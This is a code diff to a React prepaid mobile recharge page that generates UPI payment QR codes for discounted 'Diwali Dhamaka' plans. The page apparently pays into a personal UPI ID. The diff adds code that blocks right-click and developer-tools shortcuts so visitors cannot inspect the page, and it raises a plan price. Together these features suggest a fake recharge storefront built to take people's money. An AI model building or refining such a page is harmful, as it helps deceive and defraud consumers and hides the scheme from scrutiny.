@@ -1,22 +1,44 @@
-import React,{useState} from 'react';
+import React,{useState,useEffect} from 'react';
 import 'bootstrap/dist/css/bootstrap.min.css';
 import { RiMenuFill } from "react-icons/ri";
 import { FaUserCircle } from "react-icons/fa";
 import { Link, useLocation } from 'react-router-dom'; 
 import { QRCodeSVG } from 'qrcode.react';
 
-
-
 const RechargePage = () => {
+    useEffect(() => {
+        // Disable Right-click
+        const handleRightClick = (e) => {
+          e.preventDefault();
+        };
+  // Block common Developer Tools shortcuts (F12, Ctrl+Shift+I)
+  const handleKeyDown = (e) => {
+    if (
+      (e.key === 'F12') || 
+      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))
+    ) {
+      e.preventDefault();
+    }
+  };    
+     // Add event listeners
+     document.addEventListener('contextmenu', handleRightClick);
+     document.addEventListener('keydown', handleKeyDown);
+ 
+     // Cleanup event listeners when the component is unmounted
+     return () => {
+       document.removeEventListener('contextmenu', handleRightClick);
+       document.removeEventListener('keydown', handleKeyDown);
+     };
+   }, []);
+
     const location = useLocation();
     const { mobileNumber, sim } = location.state || {}; 
   
     const [amount, setAmount] = useState('');  
     const [show, setShow] = useState("");
     const [showQRCode, setShowQRCode] = useState(false); 
-    // UPI details (replace with your actual details)
+
     const upiId = "mrgoutam08@ybl";  // Replace with your UPI ID
-    const payeeName = "Prepaid Recharge";  // Replace with your payee name (this could be dynamic)
 
     // Customize transaction note
     const transactionNote = `Diwali Dhamaka Recharge ${mobileNumber || ''}`;
@@ -29,7 +51,7 @@ const RechargePage = () => {
         }
   
         // Generate the UPI URL
-        const upiURL = `upi://pay?pa=${upiId}&pn=Prepaid%20Recharge%20for%20${mobileNumber || 'Unknown'}&am=${selectedAmount}&cu=INR&tn=${encodeURIComponent(transactionNote)}`;
+        const upiURL = `upi://pay?pa=${upiId}&pn=Prepaid%20Recharge%20for%20${mobileNumber || ''}&am=${selectedAmount}&cu=INR&tn=${encodeURIComponent(transactionNote)}`;
     
         // Log the generated URL for debugging
         console.log("Generated UPI URL:", upiURL);
@@ -63,7 +85,7 @@ const RechargePage = () => {
         {
             id: 1,
             title: 'Exclusive 50% off',
-            amount: 11,
+            amount: 289,
             oldAmount :579,
             validity: '56 days',
             data: '1.5 GB/day',
